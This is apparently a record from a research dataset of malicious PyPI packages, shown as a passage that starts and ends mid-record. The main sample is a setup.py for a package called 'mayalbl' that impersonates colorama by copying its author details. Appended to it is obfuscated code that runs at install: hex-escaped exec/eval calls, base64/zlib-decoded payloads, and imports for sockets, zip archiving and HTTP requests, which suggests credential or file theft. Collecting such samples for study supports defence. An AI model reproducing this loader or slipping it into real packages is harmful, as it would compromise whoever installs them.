knO;K&~n;R}Z%p%pUccyNAknEBwWBYA_M)mA2=yq|xb}eN3M2ioC^I}^kx{qlHO${a5^jakYEcMiYqJ}Yr%C&(Lll?rl|NrGmS)<!s?SGV6XcQqzm5uW-y{Bd8`dQff-InnI#pg3JAN+5;S7BeD)W1!LQE+E&q#^lEDJ6EU*naPuoPHjYfH-7zHYGQjop0hb4TZ}}SBZjnqXW!QL!s(=7f(qdSQlc+bjtcMqvvs?F#mLQuXTRBBk4ogS}?s^E713=Zbfe8ou^{?Uyx5;)U9RPkGQ7cJ;hiBZ0z>rNo78{Ph~yAp$?(-F;Td?DoIBC%$3J%|Fq$_aCG8<Wmq{gKB@fKmCxWwdv{-Ms>SAj^Wiit&i{C$No^3pv5fS&Mki3)uodn4P6~naEMizLKOSR!Obr>r_Dt5k=2<&hXVTf7O|TnNKCp4{my`gHdslIyfJq~`N*EK&9<sLcYNh9c$Kujr6#UdpzCVz^c_;T$QYm_ifW&m?1jC_N3;B)TVe*-)yXHzKhQSiQv~E@`C0Oleb*yYUbrT<^UCWv~xL&<-+1#R{6{we)Pqrb&2+zSFCqey)h0V7=G8(?TDV{$G0;UjF%zD+l?=}ZP(zP4qzp@z;ts9g$VB#VK#2;xqK9!Y{D`0F`4JvFnk<h-@Sd~>xcz(_)4DqOFa9ax^C*hu%eBjY{u19v7JJEZy2rGrY7C@Z&Vm&`HSUJBrqHKhhK~z(*JIaorTyrxQUQ32s;n9>8FJt+?%-KPFuI8A>D6bZjs_o`Q!A?m1xrmm}pJPGs$c1*d7UT^u9uarbs`>5bj<5vgWF`0~{}`-{o(@=>uYX6Q4YO{Pxmwx)a_^DcD*<BIy*7`-#n=0J2lnXcVgI<Q0qR?FU%zw{&j@l2BTCzI8>u&yN+GL(UdY}dlZ4O;VwB(DHma=>2T?kHW>xt*WT%*J56G28+Tgq};n+ksC2gjCj_xYhXM{byv=9&~tGj{6@xv{$zC=SBt)6eDoHAb~$AB43d;^u?;Y#rJr%LNwo4uGgI!*0n;_#n;KtD6<(ud*l&FLm<(Wj&Ba2e^+LwDXn2u3MQgQa9&P&8G^z34o&;Uj)xgoAPR(XbY<xP!O-A$c_~T_D7ATc1^+r-7Mz(L!so16hi2_!lffj@5{_UDai#^xxux)jc#Wok}Iszc}iq+MW)I4K)8Q9k#qAOrn<ZRw(Ho<|hW~R<ZWI#FL4eOhtKW?ik;gOw}B<GUyL3{ng>NeBDdAz~<cU;Hfkrba-hsCjrj!E!WG&Wt**Avp#;#m!+2C6qTR2@L4$plJ&X+fzw`T7Tl&~+_a>!FDb?m%F;;D+s#zI$`6t;rDK3$N7RLv^m80MLQnJaaCv%NhT8N6dHAj{j;b3rk<aXX$kxcsHY<l$XQWNmvO<=d5#oq4Jmc}^7SaDgODXx)LWXrvgLY?_U%Gp1^)E>K48IM0Ys1`>_J5}9J#|a=QdJJX#LkT83~2(@II5pSMTl5@4Nt#8->W@cpCvP>7I_k{n+Sl3uopf<LWc&?frPR#tnk1{*0|3z%lCv!ZW8DwqM6yfhyB%&oYxd149ZZ-<w5|<s|X=7EDZd6W;J~9kgGO`6pJ8BIC10a2D5lMK3rA>ng&J5Bj{u)QkP=BDL}n<MvoJ{<2~L9P0dexM4spcD|{#lu{gYP{~Gwn49I^pV*%aKSs(S1!P;jC+I51h?08PbF)uUvg#XGhH#qRkc1;Cir6?bFV!~em04>>2^T2yQiph)3#g$<T1O9#bn$$8-^6QB}BGjJJd(WKa%zNksoy^yFD={HHP<C+NU2T>10#x{!nmVy;y^xD>d5;Sky0-Tca!MEUEUvp>1wF3)h};6RQ(CT@Pidk7^&Fl@3{{bMQk2?csF%(N6RP&vW&8B778M4znHY|mh1S<X-_sv0Q}7+D?m@7axP)tDFnGhYG<<^TKLlF7F42&D--#>n0l4@Hih%d#@LaWO7<w}fUJF*~h=)pwb_z#9_^^N6{3lpUYL<;Je_XrioAx7@1cd)<M8;B?c093}u*#vLx@D?Ab(QXVBz|JfnB2P}S4{T45$V{dUO&)W87()cP$YNu4!2th&~UONh)G~H_AesJhe&qpAtutjER4{pF8kij#GqR(3W?X?$4o10ntzhYTLGRt2*{b-ASUpj?_x47Agi2e<ek7sHQ#j2-)<wkk|zkG>RQ~!(neRcwWulu8RdKu%e0Bn`xPW>L+OZZCqRnLXSEXW$Mv+wA=HCTj=#Hc85kZy+W(MOF5^l?d-NX(X<MQF7Hz@`7k!)cF)&3}0~Ei2paALCKg33!OX@xRmZJ#+23uBb9W%os|K!a*E^*vcn37FFZy#;_=YarHh4+rkr8ed!94()apaY-^|MG#Fut-_<aF|hehRWw&n)l59$wjb>)YLMTA-_WO#$LzSY9m*M5o75PC^vo{RC|U$I_BEFNSdt^1o~_OG_?w{DC-A?B7CF%5KuKyCG{{osTq}$qXl!#1t16vN}qhl`CqgEUe=07Q~^u5I~U&nVLZPauCW4NShFz`-`G&$jkCh>S2UxgyT}BV=U6lbe-avEw633HWT5N1O&8b`K8zb%yFDVUF{(aLIn;AI-x~SVxCt|x8kK(ik9O2Y*&XVFq&H3KtpBIPm$TlSDHccdMQL4hVeqRf25ncr)kI}V{58SwFZVo!hug(r<!idUXLH?O$fhS^P}4j6k$0Q~MA6tD0&{B6^~iDjX$11Bsn#$qh--GiR>g66QJgZN;h<i4R`gX0E^&TVFru}&KTrA*oHcE0$mz_>GA)_h+D*eJ3sifqB!*L*?_-<}aXufT3@j7&lfOXh&+2rYlkT^T85i?Xsi$TCwE81iMV23S@JQlP>c_VEhM&HnTUC2uvmq`Z1dx<#NNs2oOUTe*U8QdQ&|WUK9H0VhLe=`IL`gXrOBYyWL5Lv?g6fxY55@z;5kxM1rp%M)X{T9)&r|6PJ~%QrNZdaDlp38ib-\nWQh5ro$1=9Naxto6dyC)!4d^*jFHC8N`@GK{u|VzphvWD+WaX1rlpQipw>{atW7g&JSqBkuN*vP69_Dm9Hntk{m)jpdVUdN3ZLrBUGUD<s@hw@4IHT0^c%v|NH>#~D<a?1}ns5ld!mNvGxLCaoChJ_E$0DUeKW2EY5gS~A6o7)jYaA@FpS9xUt@3qSk6%GqVunro1umz3=<_&HO=8LMXM0Bufhj?xkn9qSnQL;}Bx+9TLN1ng>yh<+9O8WCSRZ?B)=`=*9kGUKG(5GAr`U998Yls2KFwy!plFn=66%-lz@ar!LUkY90R$V3ksi8xK3L`PW^`F@e*tyS+DpqDX&`l(FRu2Jlpu$FCg;}E5pU&)1`+A{(gh68KPIJ%*-HEYblriO2fb*z2StuU&BhbdcZ*EbKPt{AZok6Qn0?*o0~f=q|b7Ih*LX~jBYooN1u4Oge=R9Xe|YD%J$^~+ZGqj0rCRb3NZx;_B)v44h<Y#HwFs|w6frKTDR?iXrdAI0WeL!f(^aVu*7qzNp2zNzg8dyY?K)neu5-;d9u_QEgq3df1fhhGcVuu)$nVWnw}+fL#XxR7eKU>PjHuh(EzoNm`a@|1GDHeDWo$1KHo*2(LlzaqJtUE`}<{ET7l;Ct2^zwtnwcaCLg?B$3*!wJipm+}5^1b)m_x|Bm`XQqNVC7%p<R76PQ9woT0jw|f~>R=9MKxLpW%3k-w^p>S$i9YiZeyJ9W%F1{b5Pba?8ZPk%A3E?f))f+=oI<g4vm2Co4ke0rd!xF2RQv!K4;?^Mk`OzhH*Ax4c$V^V4}?^X48c@=mDfIa-5nJ#VwGEIzU%sBMK>)yoP1QdVeF^`^XpyR`atqm-U=R79!!V_aN^kVKX!E-3VTVt_7rsf!>`zr-2!)q#P35hU7pkZ01p<;CQ)P+mcb+|zGPth*fc9N{a)q!;y#bm!1^S7QFkaGC0$pX@N9<=o;rHV'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                \n\nfrom .bettercolor_file import *\nfrom colorama import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-02-mayalbl-v5",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='mayalbl',\n    version='5',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\nimport getpass\nimport os\nimport socket\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''73y&GqPR(El6Cy|8u!6JFCv564b{;ZPb|%0350vXGkzC{tFFn;WmNa>Z_@z(zI4qPlF?TOmPfiNetNqEf#f34Vx#6mY%@p7M3Z@hiq^`T|GZHhJv#i6vv8X5rlE(&28NqNh%^k?{xx^BIUzC@MR;?0cc$2uv|pXboqMT7MC?!`w|46~h?m#mGtu8+R&ftxyKFb1|DP>>#yJoUWavuZr~*@w0<<Jz($pAWK~B%G?{lJ|@VI&_g$fz$1Ugv@w3g`{r+ru2HF!vqNk11S3w4-|C8ZtyU6R<n-YZBPT`r4OM78z!pHKa>J0@0HXz+I#{Cq?9yk=+03}oW^!F2&dF%n57-o+N8Nv#Yr-CABKF_sa;u1%gpmznFa^%NTMpqcIyjL}743UmDYn~!W?gTh%T+(Yhi)^hW6Slk!&SQKQFK;6_)Nt6!J`?wdvj427&qA!Hjd;l-pJc7cdJJO)Ook-gBf%mk2wfXI`_4x;t%fPh5^R^#?IJT;vD#4h!4@)ZoO3RlLw{=AbmTtkWJ0&Z(9n1q!3p_+b-@(d-kOeLqe^A3yT8U~2Qnh$AGGUDcb5st1rcSmsHQ%;_xaUQ%G{{uxas+vWO4rAJJ!^V$3qPsjD|a{1@VAyAsvaU=A@a^HVxR5tpRlkY&?HOy3b=vw%zQ0hlw{-<i)umt{<k9l2Q?YJqa1!im$Andd)2mw9m>oPgi8d7<Pz0#YlFjptltt@BCN}H&Le*Aa-q5DbC0~z^lmWqkEz0k=ns?#cyz9@DP^TW>I}9OeCQ!GIwz6a4#v%45WMVG`W09yruf)%qD-R&iO7T{VaA(Lwi9^otrAr!SK(_)Cx|j{ZDDb`C>~x)4|SvDx>|c4f~zNWZ|ieUJRyq1Ef1j0eqO5<t^QnScNJXb;oyVORtci+;UVVj+W8M7H5~z~eMi35L|*hR$dLh+B40%&9nJy@@<wf}mgF!@!r4T}sK%Bl7uiZaZt}Q8h`sd~3Dh#EK^qJJ&3y1Q`<==9HT;z3=-?eo7QQ!*<}AfS#Qrwjb8kU(Q7U8O@8@q62SgLWTE*dn6c=7HM(0VCEd^1BcaGptzOrzx-yFjL?VugP19a_@EMKYGPp$>~H(NluYz`Pr-_T5nMJi`2_Bi6W!Ho27jNU{>#l?cO!36Dp?Y2p<(rSZfaiP;pu7_8Wnpu#P+*q<LSb0-3Xhzk(Qk`|U=yn57i!=_Tg^FYzoJP&`P)Xe<bg>sr4hx5pEpaR=tAgTqtPzkW#a@h#Gzg>kOIveUdqHf_5n;s}(~@iWuD_$o1FlC}ubRfgvIxQVMj5+{KmHxk;s4w2BW9io+L#89RqQb(mq6d`;J<`}kITou(>uhx_R~BEsw?G#zKs=YVps$ovwqBr*%3yZ^EJa`u0p20P7s$e^awnnn!Dp7vD!jtCyr)-W`d>H!K{0)zTk#VTc||h>f$Mlh6)RGD7)uwWy0rb$W=W5@^Uyh80@Lgg=g;FpAH|~HFfhMVQ@gZ3&RknO;K&~n;R}Z%p%pUccyNAknEBwWBYA_M)mA2=yq|xb}eN3M2ioC^I}^kx{qlHO${a5^jakYEcMiYqJ}Yr%C&(Lll?rl|NrGmS)<!s?SGV6XcQqzm5uW-y{Bd8`dQff-InnI#pg3JAN+5;S7BeD)W1!LQE+E&q#^lEDJ6EU*naPuoPHjYfH-7zHYGQjop0hb4TZ}}SBZjnqXW!QL!s(=7f(qdSQlc+bjtcMqvvs?F#mLQuXTRBBk4ogS}?s^E713=Zbfe8ou^{?Uyx5;)U9RPkGQ7cJ;hiBZ0z>rNo78{Ph~yAp$?(-F;Td?DoIBC%$3J%|Fq$_aCG8<Wmq{gKB@fKmCxWwdv{-Ms>SAj^Wiit&i{C$No^3pv5fS&Mki3)uodn4P6~naEMizLKOSR!Obr>r_Dt5k=2<&hXVTf7O|TnNKCp4{my`gHdslIyfJq~`N*EK&9<sLcYNh9c$Kujr6#UdpzCVz^c_;T$QYm_ifW&m?1jC_N3;B)TVe*-)yXHzKhQSiQv~E@`C0Oleb*yYUbrT<^UCWv~xL&<-+1#R{6{we)Pqrb&2+zSFCqey)h0V7=G8(?TDV{$G0;UjF%zD+l?=}ZP(zP4qzp@z;ts9g$VB#VK#2;xqK9!Y{D`0F`4JvFnk<h-@Sd~>xcz(_)4DqOFa9ax^C*hu%eBjY{u19v7JJEZy2rGrY7C@Z&Vm&`HSUJBrqHKhhK~z(*JIaorTyrxQUQ32s;n9>8FJt+?%-KPFuI8A>D6bZjs_o`Q!A?m1xrmm}pJPGs$c1*d7UT^u9uarbs`>5bj<5vgWF`0~{}`-{o(@=>uYX6Q4YO{Pxmwx)a_^DcD*<BIy*7`-#n=0J2lnXcVgI<Q0qR?FU%zw{&j@l2BTCzI8>u&yN+GL(UdY}dlZ4O;VwB(DHma=>2T?kHW>xt*WT%*J56G28+Tgq};n+ksC2gjCj_xYhXM{byv=9&~tGj{6@xv{$zC=SBt)6eDoHAb~$AB43d;^u?;Y#rJr%LNwo4uGgI!*0n;_#n;KtD6<(ud*l&FLm<(Wj&Ba2e^+LwDXn2u3MQgQa9&P&8G^z34o&;Uj)xgoAPR(XbY<xP!O-A$c_~T_D7ATc1^+r-7Mz(L!so16hi2_!lffj@5{_UDai#^xxux)jc#Wok}Iszc}iq+MW)I4K)8Q9k#qAOrn<ZRw(Ho<|hW~R<ZWI#FL4eOhtKW?ik;gOw}B<GUyL3{ng>NeBDdAz~<cU;Hfkrba-hsCjrj!E!WG&Wt**Avp#;#m!+2C6qTR2@L4$plJ&X+fzw`T7Tl&~+_a>!FDb?m%F;;D+s#zI$`6t;rDK3$N7RLv^m80MLQnJaaCv%NhT8N6dHAj{j;b3rk<aXX$kxcsHY<l$XQWNmvO<=d5#oq4Jmc}^7SaDgODXx)LWXrvgLY?_U%Gp1^)E>K48IM0Ys1`>_J5}9J#|a=QdJJX#LkT83~2(@II5pSMTl5@4Nt#8->W@cpCvP>7I_k{n+Sl3uopf<LWc&?frPR#tnk1{*0|3z%lCv!ZW8DwqM6yfhyB%&oYxd149ZZ-<w5|<s|X=7EDZd6W;J~9kgGO`6pJ8BIC10a2D5lMK3rA>ng&J5Bj{u)QkP=BDL}n<MvoJ{<2~L9P0dexM4spcD|{#lu{gYP{~Gwn49I^pV*%aKSs(S1!P;jC+I51h?08PbF)uUvg#XGhH#qRkc1;Cir6?bFV!~em04>>2^T2yQiph)3#g$<T1O9#bn$$8-^6QB}BGjJJd(WKa%zNksoy^yFD={HHP<C+NU2T>10#x{!nmVy;y^xD>d5;Sky0-Tca!MEUEUvp>1wF3)h};6RQ(CT@Pidk7^&Fl@3{{bMQk2?csF%(N6RP&vW&8B778M4znHY|mh1S<X-_sv0Q}7+D?m@7axP)tDFnGhYG<<^TKLlF7F42&D--#>n0l4@Hih%d#@LaWO7<w}fUJF*~h=)pwb_z#9_^^N6{3lpUYL<;Je_XrioAx7@1cd)<M8;B?c093}u*#vLx@D?Ab(QXVBz|JfnB2P}S4{T45$V{dUO&)W87()cP$YNu4!2th&~UONh)G~H_AesJhe&qpAtutjER4{pF8kij#GqR(3W?X?$4o10ntzhYTLGRt2*{b-ASUpj?_x47Agi2e<ek7sHQ#j2-)<wkk|zkG>RQ~!(neRcwWulu8RdKu%e0Bn`xPW>L+OZZCqRnLXSEXW$Mv+wA=HCTj=#Hc85kZy+W(MOF5^l?d-NX(X<MQF7Hz@`7k!)cF)&3}0~Ei2paALCKg33!OX@xRmZJ#+23uBb9W%os|K!a*E^*vcn37FFZy#;_=YarHh4+rkr8ed!94()apaY-^|MG#Fut-_<aF|hehRWw&n)l59$wjb>)YLMTA-_WO#$LzSY9m*M5o75PC^vo{RC|U$I_BEFNSdt^1o~_OG_?w{DC-A?B7CF%5KuKyCG{{osTq}$qXl!#1t16vN}qhl`CqgEUe=07Q~^u5I~U&nVLZPauCW4NShFz`-`G&$jkCh>S2UxgyT}BV=U6lbe-avEw633HWT5N1O&8b`K8zb%yFDVUF{(aLIn;AI-x~SVxCt|x8kK(ik9O2Y*&XVFq&H3KtpBIPm$TlSDHccdMQL4hVeqRf25ncr)kI}V{58SwFZVo!hug(r<!idUXLH?O$fhS^P}4j6k$0Q~MA6tD0&{B6^~iDjX$11Bsn#$qh--GiR>g66QJgZN;h<i4R`gX0E^&TVFru}&KTrA*oHcE0$mz_>GA)_h+D*eJ3sifqB!*L*?_-<}aXufT3@j7&lfOXh&+2rYlkT^T85i?Xsi$TCwE81iMV23S@JQlP>c_VEhM&HnTUC2uvmq`Z1dx<#NNs2oOUTe*U8QdQ&|WUK9H0VhLe=`IL`gXrOBYyWL5Lv?g6fxY55@z;5kxM1rp%M)X{T9)&r|6PJ~%QrNZdaDlp38ib-\nWQh5ro$1=9Naxto6dyC)!4d^*jFHC8N`@GK{u|VzphvWD+WaX1rlpQipw>{atW7g&JSqBkuN*vP69_Dm9Hntk{m)jpdVUdN3ZLrBUGUD<s@hw@4IHT0^c%v|NH>#~D<a?1}ns5ld!mNvGxLCaoChJ_E$0DUeKW2EY5gS~A6o7)jYaA@FpS9xUt@3qSk6%GqVunro1umz3=<_&HO=8LMXM0Bufhj?xkn9qSnQL;}Bx+9TLN1ng>yh<+9O8WCSRZ?B)=`=*9kGUKG(5GAr`U998Yls2KFwy!plFn=66%-lz@ar!LUkY90R$V3ksi8xK3L`PW^`F@e*tyS+DpqDX&`l(FRu2Jlpu$FCg;}E5pU&)1`+A{(gh68KPIJ%*-HEYblriO2fb*z2StuU&BhbdcZ*EbKPt{AZok6Qn0?*o0~f=q|b7Ih*LX~jBYooN1u4Oge=R9Xe|YD%J$^~+ZGqj0rCRb3NZx;_B)v44h<Y#HwFs|w6frKTDR?iXrdAI0WeL!f(^aVu*7qzNp2zNzg8dyY?K)neu5-;d9u_QEgq3df1fhhGcVuu)$nVWnw}+fL#XxR7eKU>PjHuh(EzoNm`a@|1GDHeDWo$1KHo*2(LlzaqJtUE`}<{ET7l;Ct2^zwtnwcaCLg?B$3*!wJipm+}5^1b)m_x|Bm`XQqNVC7%p<R76PQ9woT0jw|f~>R=9MKxLpW%3k-w^p>S$i9YiZeyJ9W%F1{b5Pba?8ZPk%A3E?f))f+=oI<g4vm2Co4ke0rd!xF2RQv!K4;?^Mk`OzhH*Ax4c$V^V4}?^X48c@=mDfIa-5nJ#VwGEIzU%sBMK>)yoP1QdVeF^`^XpyR`atqm-U=R79!!V_aN^kVKX!E-3VTVt_7rsf!>`zr-2!)q#P35hU7pkZ01p<;CQ)P+mcb+|zGPth*fc9N{a)q!;y#bm!1^S7QFkaGC0$pX@N9<=o;rHV'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 